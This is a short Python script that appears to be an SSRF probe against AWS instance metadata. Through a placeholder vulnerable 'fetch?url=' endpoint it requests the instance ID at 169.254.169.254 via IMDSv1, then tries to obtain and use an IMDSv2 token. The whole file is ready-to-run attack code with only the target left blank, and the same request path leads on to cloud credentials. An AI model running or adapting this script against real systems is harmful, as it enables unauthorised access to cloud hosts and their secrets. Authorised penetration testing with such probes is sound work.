import requests

target = "https://TARGET.com/fetch?url=http://169.254.169.254"

def check_imdsv1():
    r = requests.get(f"{target}/latest/meta-data/instance-id")
    print("[*] IMDSv1 status code:", r.status_code)
    print("[*] Response:", r.text)

def check_imdsv2():
    try:
        # Request token (IMDSv2)
        token = requests.put(
            f"{target}/latest/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            timeout=5
        )
        print("[*] IMDSv2 Token Status:", token.status_code)
        if token.status_code == 200:
            access = requests.get(
                f"{target}/latest/meta-data/instance-id",
                headers={"X-aws-ec2-metadata-token": token.text},
                timeout=5
            )
            print("[+] IMDSv2 Instance ID:", access.text)
        else:
            print("[-] Cannot obtain token. IMDSv2 likely protected.")
    except Exception as e:
        print("Error:", e)

print("==[ Check IMDSv1 ]==")
check_imdsv1()

print("\n==[ Check IMDSv2 ]==")
check_imdsv2()
